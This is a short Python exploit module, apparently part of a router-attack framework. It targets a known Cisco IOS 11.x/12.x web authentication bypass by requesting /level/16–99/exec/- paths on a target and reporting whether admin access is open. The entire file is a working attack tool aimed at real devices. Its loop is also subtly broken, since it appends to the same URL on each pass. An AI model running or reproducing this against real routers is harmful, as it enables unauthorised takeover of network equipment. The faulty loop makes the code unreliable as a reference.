from ..router_vuln import RouterVuln
import util
import urllib


class ios_full_admin(RouterVuln):

    def __init__(self):
        self.router = 'Cisco IOS 11.x/12.x'
        self.vuln   = 'Full Admin'
        super(ios_full_admin, self).__init__()

        self.info = """
                    Exploit a remote admin vulnerability in Cisco IOS 11.x/12.x routers
                    http://www.exploit-db.com/exploits/20975/
                    """

    def initialize(self):
        url = 'http://%s/level/' % (self.config['target'].value)
        for idx in range(16, 100):
            url += str(idx) + '/exec/-'
            response = urllib.urlopen(url).read()
            if '200 ok' in response.lower():
                util.Msg('Device vulnerable.  Connect to %s for admin'
                                          % (self.config['target'].value))
                return
        util.Msg('Device not vulnerable.')
        return
